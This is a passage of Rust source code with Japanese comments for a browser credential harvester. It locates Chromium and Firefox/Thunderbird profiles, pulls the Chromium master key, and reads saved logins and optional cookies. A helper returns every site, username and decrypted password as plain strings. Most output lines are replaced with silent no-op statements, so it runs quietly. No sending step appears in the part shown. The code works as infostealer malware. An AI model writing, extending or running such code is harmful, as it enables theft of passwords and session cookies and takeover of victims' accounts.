            // Chromiumベースブラウザの処理
            debug!("Processing Chromium-based browser: {}", profile.browser_type.name());
            
            // マスターキーを取得
            let master_key = get_master_key(&profile.local_state_path)?;

            // ログインデータを処理
            match process_login_database(profile, master_key.as_deref()) {
                Ok(mut login_entries) => {
                    results.login_entries.append(&mut login_entries);
                }
                Err(_e) => {
                    let _ = ();
                }
            }

            // Cookieデータを処理（オプション）
            if include_cookies {
                match process_cookie_database(profile, master_key.as_deref()) {
                    Ok(mut cookie_entries) => {
                        results.cookie_entries.append(&mut cookie_entries);
                    }
                    Err(_e) => {
                        let _ = ();
                    }
                }
            }
        }

        Ok(results)
    }

    /// ブラウザプロファイルを発見（Firefox対応版）
    fn find_browser_profiles(&self) -> ChromiumResult<Vec<BrowserProfile>> {
        let mut profiles = Vec::new();

        for browser_type in &self.browsers {
            if let Some(user_data_path) = browser_type.user_data_path() {
                if !user_data_path.exists() {
                    debug!("Browser not found: {} at {:?}", browser_type.name(), user_data_path);
                    continue;
                }

                info!("Scanning browser: {} at {:?}", browser_type.name(), user_data_path);

                // Firefoxベースブラウザの処理
                if matches!(browser_type, BrowserType::Firefox | BrowserType::FirefoxDev | 
                           BrowserType::FirefoxNightly | BrowserType::Thunderbird) {
                    profiles.extend(self.find_firefox_profiles(&browser_type, &user_data_path)?);
                } else {
                    // Chromiumベースブラウザの処理
                    profiles.extend(self.find_chromium_profiles(&browser_type, &user_data_path)?);
                }
            }
        }

        debug!("Found {} profiles total", profiles.len());
        Ok(profiles)
    }

    /// Firefox専用プロファイル発見
    fn find_firefox_profiles(&self, browser_type: &BrowserType, base_path: &Path) -> ChromiumResult<Vec<BrowserProfile>> {
        let mut profiles = Vec::new();
        
        // profiles.iniを探す
        let profiles_ini = base_path.join("profiles.ini");
        
        if profiles_ini.exists() {
            let _ = ();
            
            // profiles.iniを使用してプロファイルを取得
            match get_default_profile() {
                Ok(profile_path) => {
                    if profile_path.exists() {
                        // Firefox プロファイルのlogins.jsonまたはsignons.sqliteをチェック
                        let logins_json = profile_path.join("logins.json");
                        let signons_sqlite = profile_path.join("signons.sqlite");
                        
                        if logins_json.exists() || signons_sqlite.exists() {
                            let profile_name = profile_path
                                .file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("default")
                                .to_string();

                            profiles.push(BrowserProfile::new(
                                browser_type.clone(),
                                profile_name,
                                profile_path,
                                PathBuf::new(), // Firefoxは Local State ファイルを使用しない
                            ));
                            
                            info!("Added Firefox profile: {}", browser_type.name());
                        }
                    }
                }
                Err(_e) => {
                    let _ = ();
                }
            }
        } else {
            // profiles.iniが見つからない場合、直接ディレクトリをスキャン
            let _ = ();
            
            if let Ok(entries) = fs::read_dir(base_path) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() {
                        let logins_json = path.join("logins.json");
                        let signons_sqlite = path.join("signons.sqlite");
                        
                        if logins_json.exists() || signons_sqlite.exists() {
                            let profile_name = path
                                .file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("unknown")
                                .to_string();

                            profiles.push(BrowserProfile::new(
                                browser_type.clone(),
                                profile_name,
                                path,
                                PathBuf::new(),
                            ));
                        }
                    }
                }
            }
        }
        
        Ok(profiles)
    }

    /// Chromium専用プロファイル発見
    fn find_chromium_profiles(&self, browser_type: &BrowserType, user_data_path: &Path) -> ChromiumResult<Vec<BrowserProfile>> {
        let mut profiles = Vec::new();

        // 再帰的にディレクトリをスキャン
        for entry in WalkDir::new(&user_data_path)
            .follow_links(false)
            .max_depth(3)
        {
            let entry = match entry {
                Ok(e) => e,
                Err(_e) => {
                    let _ = ();
                    continue;
                }
            };

            let path = entry.path();
            if !path.is_dir() {
                continue;
            }

            // Local Stateファイルが存在するか確認
            let local_state_path = path.join("Local State");
            if !local_state_path.exists() {
                continue;
            }

            // プロファイルディレクトリを探す
            if let Ok(read_dir) = std::fs::read_dir(path) {
                for dir_entry in read_dir.flatten() {
                    let profile_path = dir_entry.path();
                    if !profile_path.is_dir() {
                        continue;
                    }

                    // データベースファイルが存在するかチェック
                    let login_data_path = profile_path.join(DatabaseType::LoginData.filename());
                    if login_data_path.exists() {
                        let profile_name = profile_path
                            .file_name()
                            .and_then(|n| n.to_str())
                            .unwrap_or("Unknown")
                            .to_string();

                        profiles.push(BrowserProfile::new(
                            browser_type.clone(),
                            profile_name,
                            profile_path,
                            local_state_path.clone(),
                        ));
                    }
                }
            }
        }

        Ok(profiles)
    }

    /// 結果を表示
    pub fn display_results(&self, results: &DatabaseResults) {
        let _separator_long = "────────────────────────────────────────────────────────────────────────────────────────────────────────────────────";
        let _separator_short = "────────────────────────────────────────────────────────────────────────────────";
        
        if !results.login_entries.is_empty() {
            let _ = ();
            let _ = ();
            let _ = ();

            for entry in &results.login_entries {
                #[cfg(feature = "datetime")]
                let format_date = |date: Option<DateTime<Utc>>| {
                    date.map(|d| d.format("%Y-%m-%d %H:%M:%S").to_string())
                        .unwrap_or_else(|| "Unknown".to_string())
                };
                
                #[cfg(not(feature = "datetime"))]
                let format_date = |date: Option<i64>| {
                    date.map(|d| d.to_string())
                        .unwrap_or_else(|| "Unknown".to_string())
                };

                let _created = format_date(entry.date_created);
                let _last_used = format_date(entry.date_last_used);

                let _ = ();
            }
        }

        if !results.cookie_entries.is_empty() {
            let _ = ();
            let _ = ();
            let _ = ();

            results.cookie_entries.iter().for_each(|_entry| {
                let _ = ();
            });
        }
    }
}

// ===============================================================================
// メイン実行関数
// ===============================================================================

/// 統合ブラウザデータ収集関数（ChromiumとFirefox両方対応）
pub fn collect_all_browser_data(include_cookies: bool) -> Result<DatabaseResults> {
    let scanner = ChromiumScanner::new();
    scanner.scan_all_browsers(include_cookies)
        .map_err(|e| anyhow::anyhow!("Browser scan failed: {}", e))
}

/// シンプルなブラウザパスワード収集（文字列リスト返却）
pub fn collect_browser_passwords_simple() -> Result<Vec<String>> {
    collect_all_browser_data(false)
        .map(|results| {
            results.login_entries.into_iter()
                .map(|entry| {
                    if !entry.password.is_empty() && entry.password != "[NSS_DECRYPTION_REQUIRED]" {
                        format!(
                            "{} - {}: {} / {}",
                            entry.browser_name,
                            entry.origin_url,
                            entry.username,
                            entry.password
                        )
                    } else {
                        format!(
                            "{} - {}: {} [ENCRYPTED]",
                            entry.browser_name,
                            entry.origin_url,
                            entry.username
                        )
                    }
                })
                .collect()
        })
        .or_else(|e| {
            let _ = ();
            Ok(vec![format!("Browser password collection failed: {}", e)])
        })
}

/// メイン実行関数
pub fn chromium_data() -> Result<()> {
    // ログ初期化（標準ライブラリ版）
    let _ = ();

    // コマンドライン引数の解析
    let args: Vec<String> = env::args().collect();
    let include_cookies = args.contains(&"--include-cookies".to_string());
    let verbose = args.contains(&"--verbose".to_string()) || args.contains(&"-v".to_string());

    if verbose {
        let _ = ();
    }

    // スキャナーを初期化
    let scanner = ChromiumScanner::new();

    // スキャンを実行
    match scanner.scan_all_browsers(include_cookies) {
        Ok(results) => {
            let _ = ();
            
            // 結果を表示
            scanner.display_results(&results);
            
            let _ = ();
            let _ = ();
            
            // ブラウザ別統計
            for (_browser, _count) in results.browser_stats() {
                let _ = ();
            }
        }
        Err(_e) => {
            let _ = ();
            std::process::exit(1);
        }
    }
    
    Ok(())
}
